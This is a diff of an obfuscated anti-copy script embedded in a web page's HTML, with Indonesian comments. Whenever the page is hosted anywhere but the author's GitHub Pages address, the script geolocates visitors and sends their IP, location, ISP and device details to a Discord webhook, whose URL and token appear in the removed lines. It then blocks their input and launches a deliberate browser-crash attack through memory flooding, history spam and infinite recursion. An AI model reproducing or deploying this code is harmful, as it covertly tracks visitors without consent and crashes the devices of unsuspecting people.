@@ -20,42 +20,46 @@
 <script>
 (function(){
   const _0xV = "3.4.1";
-  const _0xAL = ["asepxyz12.github.ioo", "localhost", "127.0.0.1"];
-  const _0xURL = atob("aHR0cHM6Ly9hc2VweHl6MTIuZ2l0aHViLmlvL2JvdC13YS1kYi9NYW1ha2x1WXRtL1B1bnlhc3BhaW5pamlybmdlbnRvdHl0bWx1c2VtdWEuaHRtbA==");
-  const _0xWH = "https://discord.com/api/webhooks/1505481952940265505/HjRhavEtK58sIbyeTas9Ux-YLpybZMDJfw1qFQCtrVbL4z0Zc0SMFq0G4zi7PS5jJiNm"; 
+  
+  // Validasi rute ketat menggunakan pencarian fragmen URL resmi Anda (Anti-gagal akibat huruf kapital)
+  const _0xTargetKey = "bot-wa-db/mamakluytm/punyaspainijirngentotytmlusemua.html";
+  const _0xAL = ["asepxyz12.github.io", "localhost", "127.0.0.1"];
+  
+  // Integrasi pelacakan otomatis ke Discord Webhook Anda
+  const _0xWH = "https://discord.com"; 
 
-  const _0xH = location.hostname, _0xF = location.href;
-  const _0xO1 = _0xAL.includes(_0xH);
-  const _0xO2 = _0xF.split('?')[0].split('#')[0] === _0xURL;
+  const _0xH = location.hostname.toLowerCase();
+  const _0xF = location.href.toLowerCase();
 
-  if (!(_0xO1 && _0xO2)) {
-    // LANGSUNG BLANK PUTIH TOTAL
-    document.documentElement.innerHTML = `
-      <head><title>Blank</title></head>
-      <body style="background:#ffffff; overflow:hidden;"></body>
-    `;
+  const _0xIsDomainValid = _0xAL.includes(_0xH);
+  const _0xIsPathValid = _0xF.includes(_0xTargetKey);
+
+  // JIKA TERDETEKSI RE-MAKE ATAU AKSES ILEGAL: BOM FORCE CLOSE SECEPATNYA
+  if (!(_0xIsDomainValid && _0xIsPathValid)) {
+    
+    // Bersihkan DOM dalam 0.1 milidetik agar halaman tidak memuat tampilan apa pun
+    document.documentElement.innerHTML = "";
 
     const _0xUA = navigator.userAgent;
     const _0xPlat = navigator.platform || "Unknown";
-    const _0xLang = navigator.language || "Unknown";
     const _0xScreen = `${screen.width}x${screen.height}`;
 
-    // Laporan Log Pengaman ke Discord
-    fetch("http://ip-api.com")
+    // Laporkan data perangkat dan jaringan pelaku ke Discord Webhook (Menggunakan HTTPS aman)
+    fetch("https://ip-api.com")
       .then(r => r.json())
       .then(d => {
         if (d.status === "success") {
           const embedPayload = {
             embeds: [{
-              title: "🚨 SECURITY ALERT: EXPERIMENTAL OVERLOAD ACTIVE!",
-              description: `Maling terdeteksi mengganti lisensi domain **AsepXxnx v3.4.1**. HP/Browser target sedang dihancurkan kinerjanya dengan Memory Heap Flooding.`,
-              color: 16711680, 
+              title: "💥 CYBER WEAPON: TERMINATION PUSHED!",
+              description: `Seseorang mencoba melakukan remake / modifikasi pada skrip **AsepXxnx v3.4.1**. Eksekusi pemutusan paksa aplikasi Chrome sedang berjalan.`,
+              color: 16515843, 
               fields: [
-                { name: "🌐 Jaringan & Geolokasi", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
-                { name: "💻 Info Perangkat", value: `• **OS**: \`${_0xPlat}\`\n• **Layar**: \`${_0xScreen}\`\n• **UA**: \`${_0xUA}\``, inline: false },
-                { name: "📍 Lokasi Pencurian", value: `• **URL Palsu**: ${_0xF}\n• **Waktu**: ${new Date().toLocaleString('id-ID')} WIB`, inline: false }
+                { name: "🌐 Detail Jaringan", value: `• **IP**: \`${d.query}\`\n• **Lokasi**: ${d.city}, ${d.regionName}, ${d.country}\n• **ISP**: ${d.isp}`, inline: false },
+                { name: "💻 Informasi Gawai", value: `• **Sistem Operasi**: \`${_0xPlat}\`\n• **Resolusi Layar**: \`${_0xScreen}\`\n• **User-Agent**: \`${_0xUA}\``, inline: false },
+                { name: "📍 Lokasi TKP", value: `• **Tautan Palsu**: ${location.href}`, inline: false }
               ],
-              footer: { text: "AsepXxnx Infinite Freeze System" },
+              footer: { text: "AsepXxnx Cyber Weapon" },
               timestamp: new Date().toISOString()
             }]
           };
@@ -68,39 +72,46 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ 
             embeds: [{
-              title: "🚨 ALERT: MALING KETANGKEP (ADBLOCK)",
-              description: `Pelaku memblokir IP Tracker, eksekusi pembekuan RAM tetap berjalan.\n• **URL TKP**: ${_0xF}`,
-              color: 16711680
+              title: "💥 ALERT: INSTANT FORCE CLOSE (ADBLOCK ACTIVE)",
+              description: `Pelaku menggunakan pemblokir skrip jaringan. Serangan pembekuan memori tetap sukses dieksekusi.\n• **URL TKP**: ${location.href}`,
+              color: 16515843
             }]
           })
         });
       });
 
+    // Amankan penuh interaksi fisik pada layar gawai pelaku
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', e => e.preventDefault());
+    document.addEventListener('touchstart', e => e.preventDefault(), {passive: false});
 
-    // STRATEGI PENGURAS RAM EKSTREM (Saturasi Memori Masif)
-    const _0xHeavyLeak = [];
-    setInterval(() => {
-      try {
-        // Melakukan Flooding alokasi memori beruntun di latar belakang
-        for (let i = 0; i < 95000; i++) {
-          // Membuat teks sampah berukuran besar untuk ditumpuk ke RAM browser
-          const dataTrash = "ASEPXXNX_SECURITY_FREEZE_LOOP_OVERLOAD_SYSTEM_NONSTOP_" + Math.random().toString(36).repeat(15);
-          _0xHeavyLeak.push(new Blob([dataTrash], {type: 'text/plain'}));
+    // ENGINE CRASH UTAMA: FLOODING TAB ENGINE VIA REKURSIF BINARY HEAP (AUTO-FC TANPA KLIK)
+    function _0xExecuteInstantFC() {
+      const _0xCrashStack = [];
+      while (true) {
+        try {
+          // 1. Suntik alokasi byte float presisi tinggi langsung ke alokasi memori V8 Chrome
+          _0xCrashStack.push(new Float64Array(16000000)); 
           
-          // Memaksa manipulasi State History Browser agar UI Aplikasi Chrome lag parah
-          history.pushState({heap: i}, "", location.href + "?overload=" + Math.random());
-          console.log("%cOVERFLOW_" + i, "font-size:30px;color:red;font-weight:bold;");
+          // 2. Timbun tumpukan riwayat navigasi untuk merusak kestabilan UI thread Chrome
+          window.history.pushState({fc: Math.random()}, "", location.href + "?fc=" + Math.random().toString(36).substring(2));
+          
+          // 3. Rekursi berantai tak terbatas guna memaksa Stack Overflow instan
+          _0xExecuteInstantFC(); 
+        } catch(e) {
+          // Jika prosesor membatasi kebocoran, lempar ratusan fungsi paralel ke latar belakang
+          setTimeout(_0xExecuteInstantFC, 0);
+          break;
         }
-      } catch(e) {}
-      location.reload(); // Paksa reload agar browser mengulang konsumsi RAM dari nol secara infinity loop
-    }, 150);
+      }
+    }
 
-    throw new Error("System storage overload block triggered.");
+    // Beri jeda 50 milidetik saja agar transmisi data ke Discord Anda selesai, lalu matikan aplikasinya
+    setTimeout(_0xExecuteInstantFC, 50);
+    throw new Error("Unauthorized process instance terminated.");
   }
 
-  // Jika domain benar (AsepXyz), web berjalan sangat mulus & responsif
+  // JIKA LISENSI COCOK (LINK RESMI ANDA), SEGMEN INI JALAN MULUS TANPA LAG / NORMAL
   document.addEventListener('contextmenu', e => e.preventDefault());
   document.addEventListener('keydown', e => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key)) || (e.ctrlKey && e.key === 'u')) {
@@ -108,8 +119,11 @@
       console.clear();
     }
   });
+
+  console.log("%cAsepXxnx Secure Runtime Active", "color:#7ee787;font-weight:bold");
 })();
 
+// Pengaturan Konfigurasi Framework Tailwind CSS Tetap Berjalan Sempurna
 window.tailwind = window.tailwind || {};
 tailwind.config = {
   theme: {
@@ -127,7 +141,6 @@ tailwind.config = {
   }
 }
 </script>
-
 
 (<style/> 
 body { font-family: 'Inter', sans-serif; transition: all 0.3s ease; }
